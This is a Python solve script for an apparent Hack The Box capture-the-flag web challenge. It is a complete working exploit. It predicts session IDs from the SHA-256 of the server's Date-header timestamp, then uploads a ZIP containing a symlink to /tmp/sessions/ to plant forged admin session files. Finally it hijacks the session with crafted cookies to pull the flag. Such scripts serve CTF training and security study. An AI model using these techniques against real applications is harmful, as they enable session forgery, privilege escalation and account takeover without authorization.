import requests
import hashlib
import zipfile
import io
import json
import re
import uuid

from email.utils import parsedate_to_datetime


# URL = "http://154.57.164.65:32165"
URL = "http://localhost:1337"
RANDOM_SUFFIX = str(uuid.uuid4())[:8]       # To avoid collisions in Redis with other players
TARGET_USER = f"vego{RANDOM_SUFFIX}"        # The username we want to "create" as admin
ATTACKER_USER = f"bad_vego{RANDOM_SUFFIX}"  # A real account used to perform the upload


def get_session_id_from_date(date_str):
    # Convert the HTTP Date header to a Unix timestamp and return the SHA256 hash used by the Go backend.
    dt = parsedate_to_datetime(date_str)
    timestamp = int(dt.timestamp())
    
    # We generate a few IDs around the timestamp to account for server-side drift
    hashes = []
    for offset in [-1, 0, 1]:
        ts_str = str(timestamp + offset).encode()
        hashes.append(hashlib.sha256(ts_str).hexdigest())

    return hashes


def solve():
    session = requests.Session()

    # The server uses Redis and it sets in the Redis memory that the username value maps to
    # sessionID before the credentials are validated.
    # We can guess the sessionID using the Date header in the HTTP response.
    print(f"Triggering ghost session for '{TARGET_USER}'...")
    
    # This updates Redis with a new ID but fails before creating the file
    login_res = session.post(f"{URL}/login", json={
        "username": TARGET_USER, 
        "password": "wrong_password"
    })
    
    server_date = login_res.headers.get('Date')
    predicted_ids = get_session_id_from_date(server_date)
    print(f"[+] Predicted IDs from server date ({server_date}):")
    for pid in predicted_ids:
        print(f"    - {pid}")

    print(f"[*] Crafting malicious ZIP with symlink...")
    admin_payload = json.dumps({
        "username": TARGET_USER,
        "id": 1337,     # Arbitrary ID for our new user
        "role": "admin"
    }).encode()

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as zf:
        symlink_name = f"session_link{RANDOM_SUFFIX}"   # Symlink pointing to the target's session directory
        sym_info = zipfile.ZipInfo(symlink_name)
        sym_info.create_system = 3                      # Unix
        sym_info.external_attr = 0o120777 << 16
        zf.writestr(sym_info, f"/tmp/sessions/")
        
        # Add a file for each predicted ID to increase success rate
        for pid in predicted_ids:
            zf.writestr(f"{symlink_name}/{TARGET_USER}/{pid}", admin_payload)

    print(f"[*] Logging in as '{ATTACKER_USER}' to perform upload...")
    
    # Ensure this user exists first! We'll use the username as password for simplicity
    session.post(f"{URL}/register", json={"username": ATTACKER_USER, "password": ATTACKER_USER})
    session.post(f"{URL}/login", json={"username": ATTACKER_USER, "password": ATTACKER_USER})

    print("[*] Uploading exploit archive...")
    files = {'archive': ('exploit.zip', buf.getvalue(), 'application/zip')}
    up_res = session.post(f"{URL}/user/upload", files=files)
    
    if up_res.status_code == 202:
        print("[!] Upload successful! Now hijacking the ghost session...")

        # We try each predicted ID until one works
        for pid in predicted_ids:
            headers = {"Cookie": f"username={TARGET_USER}; session={pid}"}
            flag_res = requests.get(f"{URL}/user/admin", headers=headers)

            flag_match = re.search(r"HTB\{.*?\}", flag_res.text)
            if flag_match:
                print(f"[+] Success with Session ID: {pid}")
                print(f"[*] Flag Found: {flag_match.group(0)}")
                return

        print("[-] Failed to find the flag. The timestamp might have been off.")
    else:
        print(f"[-] Upload failed ({up_res.status_code}): {up_res.text}")


if __name__ == "__main__":
    solve()